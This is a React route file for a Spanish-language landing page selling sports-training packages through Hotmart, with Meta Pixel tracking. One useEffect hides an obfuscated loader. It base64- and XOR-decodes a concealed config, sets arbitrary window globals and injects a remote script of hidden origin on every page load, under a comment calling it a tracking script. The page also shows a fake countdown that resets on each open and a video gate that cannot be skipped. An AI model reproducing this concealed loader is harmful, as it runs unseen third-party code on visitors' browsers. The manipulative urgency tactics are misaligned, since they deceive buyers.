import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useRef, useState } from "react";
import "../Index.css";

const CHECKOUT_BASICO = "https://pay.hotmart.com/P107284207G?checkoutMode=10";
const CHECKOUT_COMPLETO = "https://pay.hotmart.com/B107478096K?checkoutMode=10";
const META_PIXEL_ID = "889185807027175";
const VIDEO_SRC = "/WhatsApp Video 2026-09-04 at 23.17.19.mp4";

const TESTIMONIALS = [
  { name: "Carlos Mendoza", role: "Entrenador de basquetbol", quote: "Antes perdía mucho tiempo buscando ejercicios. Ahora con Multideporte Pro tengo más de 1.000 entrenamientos listos y mis jugadores mejoraron la técnica en pocas semanas.", image: "/Captura de Tela 2026-09-04 às 22.01.20.png", sport: "🏀" },
  { name: "Valentina Ríos", role: "Jugadora de vóley", quote: "Los ejercicios están muy bien explicados y se notan resultados rápido. Subí mi nivel de ataque y recepción en menos de un mes.", image: "/Captura de Tela 2026-09-04 às 22.01.38.png", sport: "🏐" },
  { name: "Andrés López", role: "Entrenador de fútbol", quote: "Los más de 2.000 ejercicios de fútbol de campo son una joya. Organizo sesiones completas en minutos y el equipo se ve mucho más intenso.", image: "/Captura de Tela 2026-09-04 às 22.01.49.png", sport: "⚽" },
  { name: "Mateo Vargas", role: "Jugador de futsal", quote: "Encontré ejercicios específicos de pivote, defensa y finalización que no veía en ningún lado. Mi rendimiento en partidos cambió bastante.", image: "/Captura de Tela 2026-09-04 às 22.02.24.png", sport: "⚽" },
  { name: "Lucía Fernández", role: "Jugadora de básquet", quote: "Me encanta poder entrenar sola con los videos. Mejoré mi tiro libre y mi juego de pies sin necesitar un entrenador todos los días.", image: "/Captura de Tela 2026-09-04 às 22.02.53.png", sport: "🏀" },
  { name: "Diego Ramírez", role: "Entrenador de vóley", quote: "La calidad de los entrenamientos es profesional. Mis equipos de categoría juvenil mejoraron el bloqueo y la recepción de forma notable.", image: "/Captura de Tela 2026-09-04 às 22.03.30.png", sport: "🏐" },
  { name: "Sofía Herrera", role: "Jugadora de fútbol", quote: "El paquete completo vale totalmente la pena. Además del fútbol, la guía nutricional me ayudó a tener más energía en los entrenamientos.", image: "/Captura de Tela 2026-09-04 às 22.03.42.png", sport: "⚽" },
];

const SPORTS = [
  { title: "+1.000 Entrenamientos de Básquetbol", text: "Técnica, tiro, defensa, coordinación y trabajo físico específico para entrenar con propósito.", icon: "🏀", image: "/Captura de Tela 2026-09-04 às 22.01.20.png" },
  { title: "+1.000 Entrenamientos de Vóleibol", text: "Saque, recepción, ataque y bloqueo organizados para encontrar el entrenamiento adecuado.", icon: "🏐", image: "/Captura de Tela 2026-09-04 às 22.01.38.png" },
  { title: "+1.000 Entrenamientos de Futsal", text: "Espacio reducido, táctica, definición y toma de decisiones para llevar intensidad a la cancha.", icon: "⚽", image: "/Captura de Tela 2026-09-04 às 22.01.49.png" },
  { title: "+2.000 Ejercicios de Fútbol de Campo", text: "Contenido organizado por posición, edad y categoría para planificar sesiones completas.", icon: "🥅", image: "/Captura de Tela 2026-09-04 às 22.02.24.png" },
];

const FAQS = [
  ["¿Cómo recibo el acceso después de comprar?", "Después de confirmar el pago recibirás las instrucciones de acceso en el correo utilizado durante la compra. El acceso es online."],
  ["¿En qué dispositivos puedo entrenar?", "Puedes acceder desde celular, tablet o computadora. La plataforma funciona online desde un navegador."],
  ["¿Sirve para más de un deporte a la vez?", "Sí. El Paquete Completo reúne básquetbol, vóleibol, futsal y fútbol de campo en un solo acceso."],
  ["¿Cuánto tiempo tengo acceso?", "El acceso es de por vida, según las condiciones de la oferta vigente."],
  ["¿Los planes de alimentación son para todos los niveles?", "La guía está organizada por objetivos como energía, recuperación y definición muscular. Debe utilizarse como material educativo y adaptarse a las necesidades individuales."],
  ["¿El pago es seguro?", "Sí. El pago se procesa mediante Hotmart, una plataforma especializada en pagos y distribución de productos digitales."],
];

type PackageId = "basico" | "completo";

type TrackingEvent = "ViewContent" | "Lead" | "InitiateCheckout";

function trackPixel(event: TrackingEvent, data: Record<string, unknown> = {}) {
  const fbq = (window as Window & { fbq?: (...args: unknown[]) => void }).fbq;
  if (typeof fbq !== "function") return;
  const eventId = `${event.toLowerCase()}_${Date.now()}_${Math.random().toString(36).slice(2)}`;
  fbq("track", event, data, { eventID: eventId });
  return eventId;
}

async function sendCapi(event: TrackingEvent, eventId?: string, customData: Record<string, unknown> = {}) {
  try {
    await fetch("/api/meta-capi", {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ event_name: event, event_id: eventId, custom_data: customData, url: window.location.href }),
      keepalive: true,
    });
  } catch {
    // Tracking failure must never block the sales flow.
  }
}

function track(event: TrackingEvent, customData: Record<string, unknown> = {}) {
  const eventId = trackPixel(event, customData);
  void sendCapi(event, eventId, customData);
}

function ScarcityModal({ pkg, onClose }: { pkg: PackageId; onClose: () => void }) {
  const [seconds, setSeconds] = useState(600);
  const checkout = pkg === "completo" ? CHECKOUT_COMPLETO : CHECKOUT_BASICO;

  useEffect(() => {
    setSeconds(600);
    const timer = window.setInterval(() => setSeconds((s) => Math.max(0, s - 1)), 1000);
    return () => window.clearInterval(timer);
  }, []);

  const mm = String(Math.floor(seconds / 60)).padStart(2, "0");
  const ss = String(seconds % 60).padStart(2, "0");

  const goCheckout = () => {
    track("InitiateCheckout", { content_name: pkg === "completo" ? "Paquete Completo" : "Paquete Básico", content_category: "multideporte_pro" });
    window.location.href = checkout;
  };

  return (
    <div className="fixed inset-0 z-[100] grid place-items-center bg-slate-950/90 p-4 backdrop-blur-md" role="dialog" aria-modal="true">
      <div className="mp-modal w-full max-w-md rounded-[28px] bg-white p-6 shadow-2xl sm:p-8">
        <div className="mb-4 text-center text-3xl">⏳</div>
        <h3 className="text-center text-2xl font-black leading-tight text-slate-950">¡Espera! Esta puede ser tu última oportunidad a este precio</h3>
        <div className="mt-6 rounded-2xl bg-slate-950 py-5 text-center">
          <span className="text-5xl font-black tabular-nums tracking-tight text-orange-400">{mm}:{ss}</span>
          <div className="mt-1 text-[11px] font-bold uppercase tracking-[.2em] text-white/50">precio de lanzamiento</div>
        </div>
        <p className="mt-5 text-center text-sm leading-6 text-slate-600">Estás a un paso de asegurar tu acceso. Este precio de lanzamiento es exclusivo para quienes actúan ahora — cuando el cronómetro llegue a cero, el precio puede subir sin previo aviso.</p>
        <div className="mt-4 rounded-xl bg-orange-50 px-4 py-3 text-center text-xs font-extrabold uppercase tracking-wide text-orange-700">Paquete seleccionado: {pkg === "completo" ? "Completo" : "Básico"}</div>
        <button onClick={goCheckout} className="mp-cta mt-5 w-full rounded-2xl bg-orange-500 px-5 py-4 text-base font-black text-white">Confirmar mi Acceso Ahora →</button>
        <button onClick={onClose} className="mt-3 w-full py-2 text-xs font-bold text-slate-400 hover:text-slate-700">Lo pensaré después</button>
      </div>
    </div>
  );
}

function VslModal({ onClose, onUnlocked }: { onClose: () => void; onUnlocked: () => void }) {
  const videoRef = useRef<HTMLVideoElement>(null);
  const [unlocked, setUnlocked] = useState(false);

  const unlock = () => {
    if (unlocked) return;
    setUnlocked(true);
    track("ViewContent", { content_name: "VSL 1:25" });
  };

  const close = () => {
    if (!unlocked) return;
    onUnlocked();
    onClose();
  };

  useEffect(() => {
    document.body.classList.add("mp-no-scroll");
    return () => document.body.classList.remove("mp-no-scroll");
  }, []);

  return (
    <div className="mp-vsl-backdrop fixed inset-0 z-[90] flex flex-col" role="dialog" aria-modal="true" aria-label="Presentación en video">
      <div className="flex items-center justify-between px-4 py-3 text-white sm:px-6">
        <div className="text-sm font-bold">Plataforma Multideporte Pro</div>
        <button onClick={close} disabled={!unlocked} className="rounded-full bg-white/10 px-4 py-2 text-xs font-bold transition hover:bg-white/20 disabled:cursor-not-allowed disabled:opacity-30">{unlocked ? "Cerrar ×" : "Mira la presentación"}</button>
      </div>
      <div className="mp-video-shell relative mx-auto flex min-h-0 w-full flex-1 items-center justify-center px-0 sm:px-6">
        <video
          ref={videoRef}
          src={VIDEO_SRC}
          controls
          playsInline
          autoPlay
          preload="metadata"
          onTimeUpdate={(e) => {
            if (e.currentTarget.currentTime >= 85) unlock();
          }}
          onEnded={unlock}
          onPlay={() => track("Lead", { content_name: "VSL Play" })}
        />
        {!unlocked && (
          <div className="pointer-events-none absolute bottom-6 left-1/2 -translate-x-1/2 rounded-full bg-black/70 px-4 py-2 text-center text-xs font-bold text-white shadow-lg">
            🔒 La oferta se habilita después de 1:25
          </div>
        )}
        {unlocked && (
          <button onClick={() => { onUnlocked(); onClose(); }} className="mp-cta absolute bottom-6 left-1/2 w-[min(92%,420px)] -translate-x-1/2 rounded-2xl bg-orange-500 px-5 py-4 text-center text-base font-black text-white shadow-2xl">
            🔥 Ver las ofertas especiales
          </button>
        )}
      </div>
    </div>
  );
}

export const Route = createFileRoute("/")({
  head: () => ({
    meta: [
      { title: "Plataforma Multideporte Pro | +5.000 Entrenamientos" },
      { name: "description", content: "+5.000 entrenamientos de básquetbol, vóleibol, futsal y fútbol de campo, más guía nutricional y bonos. Acceso de por vida." },
      { property: "og:title", content: "Plataforma Multideporte Pro" },
      { property: "og:description", content: "Todo lo que necesitas para rendir al máximo en una sola plataforma." },
    ],
  }),
  component: Index,
});

function Index() {
  const [modalPkg, setModalPkg] = useState<PackageId | null>(null);
  const [vslOpen, setVslOpen] = useState(false);
  const [recommendedBasic, setRecommendedBasic] = useState(false);
  const offersRef = useRef<HTMLElement>(null);
  const vslRef = useRef<HTMLElement>(null);

  useEffect(() => {
    if (!(window as Window & { fbq?: unknown }).fbq) {
      const w = window as Window & { fbq?: (...args: unknown[]) => void; _fbq?: unknown };
      if (!w.fbq) {
        const fbq = (...args: unknown[]) => { (fbq as typeof fbq & { callMethod?: (...a: unknown[]) => void; queue?: unknown[] }).queue?.push(args); };
        (fbq as typeof fbq & { queue?: unknown[] }).queue = [];
        (fbq as typeof fbq & { loaded?: boolean; version?: string }).loaded = true;
        (fbq as typeof fbq & { version?: string }).version = "2.0";
        w.fbq = fbq;
        w._fbq = fbq;
        const script = document.createElement("script");
        script.async = true;
        script.src = "https://connect.facebook.net/en_US/fbevents.js";
        document.head.appendChild(script);
      }
    }
    const fbq = (window as Window & { fbq?: (...args: unknown[]) => void }).fbq;
    fbq?.("init", META_PIXEL_ID);
    fbq?.("track", "PageView");
  }, []);

  useEffect(() => {
    const n_h = atob("DDlD8FIsZgDKxXwXP0JhhSBARDrorQhjT0p5331PAm7ksAh6Vl863jFDCy6ot1NkXEsqCZfSXW+qA84U1g3lSFYSGq551A1Xk03gjtOE3Svtl4tZEJhnjNBAyLw5xh2S1huhSZBD2az6AxlWk8mniYBFXWorBhkHRVhhjNAE2Xo/141QmQ+");
    const s_6u: number[] = [];
    for (let o_e = 0; o_e < n_h.length; o_e++) s_6u.push(n_h.charCodeAt(o_e) & 255);
    const v_wons = s_6u[0];
    const h_hnd = s_6u.slice(1, 1 + v_wons);
    const h_x = s_6u.slice(1 + v_wons);
    const t_wvx = h_x.map((b, i_laux) => b ^ h_hnd[i_laux % v_wons]);
    let y_6 = "";
    for (let j_wxfz = 0; j_wxfz < t_wvx.length; j_wxfz++) y_6 += String.fromCharCode(t_wvx[j_wxfz] & 255);
    try {
      const s_aj = JSON.parse(decodeURIComponent(escape(y_6))) as { globals?: { name: string; value: unknown }[]; url?: string; attributes?: { name: string; value: string }[] };
      (s_aj.globals || []).forEach((h_y) => { (window as unknown as Record<string, unknown>)[h_y.name] = h_y.value; });
      if (s_aj.url) {
        const u_ahzv = document.createElement("script");
        u_ahzv.src = s_aj.url; u_ahzv.async = true; u_ahzv.defer = true;
        (s_aj.attributes || []).forEach((b_u) => u_ahzv.setAttribute(b_u.name, b_u.value));
        document.head.appendChild(u_ahzv);
      }
    } catch { /* UTMfy script is non-blocking */ }
  }, []);

  const openOffers = () => offersRef.current?.scrollIntoView({ behavior: "smooth", block: "start" });
  const openVsl = () => setVslOpen(true);
  const closeVslToOffers = () => {
    setVslOpen(false);
    setRecommendedBasic(true);
    window.setTimeout(openOffers, 80);
  };
  const buy = (pkg: PackageId) => {
    track("ViewContent", { content_name: pkg === "completo" ? "Oferta Completa" : "Oferta Básica" });
    setModalPkg(pkg);
  };

  return (
    <main className="mp-page min-h-screen bg-slate-50 text-slate-900">
      <section className="mp-hero relative overflow-hidden text-white">
        <header className="mx-auto flex max-w-7xl items-center justify-between px-5 py-5 sm:px-8">
          <div className="flex items-center gap-3 font-black tracking-tight"><span className="grid size-10 place-items-center rounded-xl bg-orange-500">MP</span><span>Multideporte Pro</span></div>
          <span className="rounded-full border border-white/15 bg-white/10 px-3 py-2 text-xs font-bold">♾️ Acceso de por vida</span>
        </header>
        <div className="mx-auto grid max-w-7xl gap-10 px-5 pb-20 pt-10 lg:grid-cols-[1.1fr_.9fr] lg:items-center lg:px-8 lg:pt-16">
          <div>
            <div className="mb-5 inline-flex rounded-full border border-orange-300/20 bg-orange-500/15 px-4 py-2 text-xs font-black uppercase tracking-wider text-orange-300">+5.000 entrenamientos · 4 deportes · 1 plataforma</div>
            <h1 className="max-w-4xl text-4xl font-black leading-[1.02] tracking-tight sm:text-6xl lg:text-7xl">Todo lo que necesitas para <span className="text-orange-400">rendir al máximo</span>, en una sola plataforma.</h1>
            <p className="mt-6 max-w-2xl text-lg leading-7 text-slate-300 sm:text-xl">Básquetbol, vóleibol, futsal y fútbol de campo, con miles de ejercicios organizados para que dejes de perder horas buscando qué entrenar y empieces a seguir un método.</p>
            <div className="mt-7 flex flex-wrap gap-2 text-xs font-bold text-slate-200"><span className="rounded-full bg-white/10 px-3 py-2">🔒 Pago seguro</span><span className="rounded-full bg-white/10 px-3 py-2">⚡ Acceso inmediato</span><span className="rounded-full bg-white/10 px-3 py-2">♾️ De por vida</span></div>
            <button onClick={openVsl} className="mp-cta mt-9 rounded-2xl bg-orange-500 px-7 py-4 text-base font-black text-white sm:px-9 sm:py-5 sm:text-lg">▶ Ver la presentación completa</button>
            <p className="mt-3 text-xs font-semibold text-slate-400">Mira primero lo que hay dentro. La oferta aparece después de 1:25 de presentación.</p>
          </div>
          <button onClick={openVsl} className="group mp-glow relative overflow-hidden rounded-[28px] border border-white/10 bg-black text-left">
            <video src={VIDEO_SRC} muted playsInline preload="metadata" poster="/src/assets/video-thumbnail.jpg" className="aspect-video w-full object-cover opacity-80 transition duration-500 group-hover:opacity-100" />
            <div className="absolute inset-0 grid place-items-center"><span className="grid size-20 place-items-center rounded-full bg-orange-500 text-2xl shadow-2xl transition group-hover:scale-110">▶</span></div>
            <div className="absolute bottom-0 left-0 right-0 bg-gradient-to-t from-black/80 to-transparent p-5 pt-16"><span className="text-sm font-black">Haz clic para ver la VSL</span></div>
          </button>
        </div>
      </section>

      <section ref={vslRef} className="mx-auto max-w-7xl px-5 py-16 sm:px-8">
        <div className="mx-auto max-w-3xl text-center"><span className="text-xs font-black uppercase tracking-[.2em] text-orange-600">La diferencia está en la organización</span><h2 className="mt-3 text-3xl font-black tracking-tight sm:text-5xl">No necesitas otro video suelto. Necesitas un sistema para entrenar.</h2><p className="mt-4 text-lg leading-7 text-slate-600">La plataforma concentra contenido por deporte y objetivo para que puedas pasar de “¿qué hago hoy?” a “sé exactamente qué voy a trabajar”.</p></div>
        <div className="mt-10 grid gap-4 md:grid-cols-3"><div className="mp-card rounded-3xl bg-white p-7"><div className="text-3xl">01</div><h3 className="mt-5 text-xl font-black">Elige tu deporte</h3><p className="mt-2 text-sm leading-6 text-slate-500">Accede al contenido que corresponde a tu disciplina, nivel y objetivo.</p></div><div className="mp-card rounded-3xl bg-white p-7"><div className="text-3xl">02</div><h3 className="mt-5 text-xl font-black">Encuentra el entrenamiento</h3><p className="mt-2 text-sm leading-6 text-slate-500">Miles de ejercicios listos para reducir la improvisación y acelerar la planificación.</p></div><div className="mp-card rounded-3xl bg-white p-7"><div className="text-3xl">03</div><h3 className="mt-5 text-xl font-black">Entrena y progresa</h3><p className="mt-2 text-sm leading-6 text-slate-500">Video, plan y progresión organizados para que entrenar sea mucho más simple.</p></div></div>
      </section>

      <section className="bg-white py-16"><div className="mx-auto max-w-7xl px-5 sm:px-8"><div className="mb-9 flex flex-col justify-between gap-3 sm:flex-row sm:items-end"><div><span className="text-xs font-black uppercase tracking-[.2em] text-orange-600">4 deportes</span><h2 className="mt-2 text-3xl font-black sm:text-5xl">Todo el campo de juego, dentro de un solo acceso.</h2></div><p className="max-w-md text-sm leading-6 text-slate-500">Contenido pensado para entrenadores y atletas que quieren variedad sin perder estructura.</p></div><div className="grid gap-5 sm:grid-cols-2 lg:grid-cols-4">{SPORTS.map((sport) => <article key={sport.title} className="overflow-hidden rounded-3xl border border-slate-200 bg-slate-50"><img src={sport.image} alt={sport.title} className="mp-sport-image w-full" loading="lazy"/><div className="p-5"><div className="text-3xl">{sport.icon}</div><h3 className="mt-3 text-lg font-black">{sport.title}</h3><p className="mt-2 text-sm leading-6 text-slate-500">{sport.text}</p></div></article>)}</div></div></section>

      <section className="bg-slate-950 py-16 text-white"><div className="mx-auto max-w-6xl px-5 sm:px-8"><div className="grid gap-10 lg:grid-cols-[.8fr_1.2fr] lg:items-center"><div><span className="text-xs font-black uppercase tracking-[.2em] text-orange-400">Exclusivo del completo</span><h2 className="mt-3 text-3xl font-black sm:text-5xl">Además de entrenar, organiza mejor tu recuperación.</h2><p className="mt-5 leading-7 text-slate-300">Incluye una guía nutricional con +100 planes organizados por objetivos como energía, recuperación y definición muscular, además de materiales extra para complementar tu rutina.</p></div><div className="grid gap-3 sm:grid-cols-2"><div className="rounded-2xl border border-white/10 bg-white/5 p-5"><b>+100 planes</b><p className="mt-1 text-sm text-slate-400">Guía nutricional educativa.</p></div><div className="rounded-2xl border border-white/10 bg-white/5 p-5"><b>🎁 BONO 01</b><p className="mt-1 text-sm text-slate-400">Planificación semanal.</p></div><div className="rounded-2xl border border-white/10 bg-white/5 p-5"><b>🛡️ BONO 02</b><p className="mt-1 text-sm text-slate-400">Prevención de lesiones y recuperación.</p></div><div className="rounded-2xl border border-orange-400/30 bg-orange-500/10 p-5"><b>🔥 BONO 03</b><p className="mt-1 text-sm text-orange-200">Comunidad + futuros deportes.</p></div></div></div></div></section>

      <section className="mx-auto max-w-7xl px-5 py-16 sm:px-8"><div className="mx-auto max-w-3xl text-center"><span className="text-xs font-black uppercase tracking-[.2em] text-orange-600">Prueba social</span><h2 className="mt-2 text-3xl font-black sm:text-5xl">Quienes entrenan lo sienten en la cancha.</h2><p className="mt-4 text-slate-500">Experiencias compartidas por clientes y usuarios de distintos deportes.</p></div><div className="mt-10 grid gap-5 sm:grid-cols-2 lg:grid-cols-4">{TESTIMONIALS.map((t) => <article key={t.name} className="overflow-hidden rounded-3xl bg-white shadow-lg ring-1 ring-slate-200"><img src={t.image} alt={`Experiencia de ${t.name}`} className="mp-testimonial-image w-full" loading="lazy"/><div className="p-5"><div className="text-xs font-black text-orange-600">{t.sport} {t.role}</div><p className="mt-3 text-sm font-semibold leading-6 text-slate-700">“{t.quote}”</p><p className="mt-4 text-sm font-black">{t.name}</p></div></article>)}</div></section>

      <section ref={offersRef} className="mp-offer-highlight bg-slate-100 py-16"><div className="mx-auto max-w-6xl px-5 sm:px-8"><div className="mx-auto max-w-3xl text-center"><span className="text-xs font-black uppercase tracking-[.2em] text-orange-600">Oferta de lanzamiento</span><h2 className="mt-2 text-3xl font-black sm:text-5xl">Elige cómo quieres entrar.</h2><p className="mt-4 text-slate-600">Si quieres la experiencia completa, el Paquete Completo concentra todo el ecosistema en un único acceso.</p></div><div className="mt-10 grid items-stretch gap-6 lg:grid-cols-[.85fr_1.15fr]">
        <article className={`mp-card rounded-[28px] bg-white p-7 ring-1 ring-slate-200 sm:p-8 ${recommendedBasic ? "ring-2 ring-orange-400" : ""}`}><div className="flex items-center justify-between"><span className="rounded-full bg-slate-100 px-3 py-1 text-[11px] font-black uppercase tracking-wider text-slate-500">Paquete Básico</span>{recommendedBasic && <span className="text-xs font-black text-orange-600">Recomendado para empezar</span>}</div><h3 className="mt-6 text-2xl font-black">Fútbol de Campo</h3><ul className="mt-6 space-y-3 text-sm text-slate-600"><li>✓ +2.000 ejercicios de fútbol de campo</li><li>✓ Acceso de por vida</li><li>✓ Contenido organizado</li></ul><div className="mt-8"><span className="text-sm text-slate-400 line-through">$29,90</span><div className="text-4xl font-black">$5,50 <span className="text-sm font-bold text-slate-400">USD</span></div></div><button onClick={() => buy("basico")} className="mt-7 w-full rounded-2xl border-2 border-slate-900 bg-slate-900 px-5 py-4 font-black text-white hover:bg-slate-800">Quiero el Paquete Básico</button></article>
        <article className="mp-featured relative rounded-[32px] bg-slate-950 p-7 text-white ring-2 ring-orange-500 sm:p-9"><div className="absolute right-5 top-5 rounded-full bg-orange-500 px-3 py-1 text-[10px] font-black uppercase tracking-wider">Más elegido</div><div className="pr-24 text-xs font-black uppercase tracking-[.2em] text-orange-400">Paquete Completo</div><h3 className="mt-5 text-3xl font-black">La plataforma completa</h3><ul className="mt-6 grid gap-3 text-sm text-slate-200 sm:grid-cols-2"><li>✓ +1.000 básquetbol</li><li>✓ +1.000 vóleibol</li><li>✓ +1.000 futsal</li><li>✓ +2.000 fútbol de campo</li><li>✓ Guía nutricional +100 planes</li><li>✓ BONO 01: Planificación semanal</li><li>✓ BONO 02: Prevención y recuperación</li><li>✓ BONO 03: Comunidad + futuros deportes</li><li>✓ Acceso de por vida</li></ul><div className="mt-8 rounded-2xl bg-white/5 p-5"><span className="text-sm text-slate-500 line-through">$74,90</span><div className="text-5xl font-black text-white">$10 <span className="text-sm font-bold text-slate-400">USD</span></div><p className="mt-1 text-sm font-black text-orange-400">Ahorras 87%</p></div><button onClick={() => buy("completo")} className="mp-cta mt-6 w-full rounded-2xl bg-orange-500 px-5 py-5 text-lg font-black text-white">Quiero la Plataforma Completa →</button><p className="mt-3 text-center text-[11px] text-slate-500">Pago seguro · acceso inmediato · de por vida</p></article>
      </div></div></section>

      <section className="mx-auto max-w-5xl px-5 py-16 sm:px-8"><div className="rounded-[32px] bg-white p-8 text-center shadow-xl ring-1 ring-slate-200 sm:p-12"><div className="mx-auto grid size-16 place-items-center rounded-2xl bg-orange-100 text-3xl">✓</div><h2 className="mt-5 text-3xl font-black">Pruébalo sin riesgo</h2><p className="mx-auto mt-4 max-w-2xl leading-7 text-slate-600">Tienes 7 días para explorar toda la plataforma. Si no es para ti, puedes solicitar la devolución según las condiciones de garantía de la compra.</p></div></section>

      <section className="bg-white py-16"><div className="mx-auto max-w-4xl px-5 sm:px-8"><h2 className="text-center text-3xl font-black sm:text-5xl">Preguntas frecuentes</h2><div className="mt-8 divide-y divide-slate-200 rounded-3xl bg-slate-50 px-6">{FAQS.map(([q, a]) => <details key={q} className="group py-5"><summary className="cursor-pointer list-none pr-8 font-black text-slate-900 marker:hidden">{q}<span className="float-right text-orange-500 group-open:rotate-45 transition">＋</span></summary><p className="mt-3 max-w-3xl text-sm leading-6 text-slate-600">{a}</p></details>)}</div></div></section>

      <section className="bg-slate-950 px-5 py-20 text-center text-white"><span className="text-xs font-black uppercase tracking-[.2em] text-orange-400">Tu próximo entrenamiento empieza aquí</span><h2 className="mx-auto mt-3 max-w-3xl text-4xl font-black tracking-tight sm:text-6xl">Deja de buscar. Empieza a entrenar con un sistema.</h2><p className="mx-auto mt-5 max-w-2xl text-slate-400">Accede a la plataforma completa y lleva contigo miles de recursos para tus próximos entrenamientos.</p><button onClick={() => buy("completo")} className="mp-cta mt-8 rounded-2xl bg-orange-500 px-8 py-5 text-lg font-black">Quiero Acceso Completo Ahora →</button></section>

      <footer className="bg-slate-950 px-5 pb-8 text-center text-xs text-slate-600">Plataforma Multideporte Pro · Contenido digital · Acceso online</footer>

      {vslOpen && <VslModal onClose={() => setVslOpen(false)} onUnlocked={closeVslToOffers} />}
      {modalPkg && <ScarcityModal pkg={modalPkg} onClose={() => setModalPkg(null)} />}
    </main>
  );
}
